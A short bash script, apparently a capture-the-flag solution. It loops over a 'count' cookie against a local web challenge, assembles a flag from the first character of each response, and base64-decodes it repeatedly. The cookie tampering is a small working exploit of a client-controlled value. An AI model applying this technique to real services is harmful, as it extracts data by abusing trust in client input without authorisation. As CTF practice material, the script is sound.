#!/bin/bash
flag=
url=http://localhost:10200/kiddie/

for i in `seq 0 599`; do
    text=`curl -s $url -H "Cookie: count=$i"`
    char=${text:0:1}
    flag=$flag$char
    echo -n $char
done

for i in `seq 10`; do
    flag=`echo $flag | base64 --decode`
    echo -n ' | '$flag
done
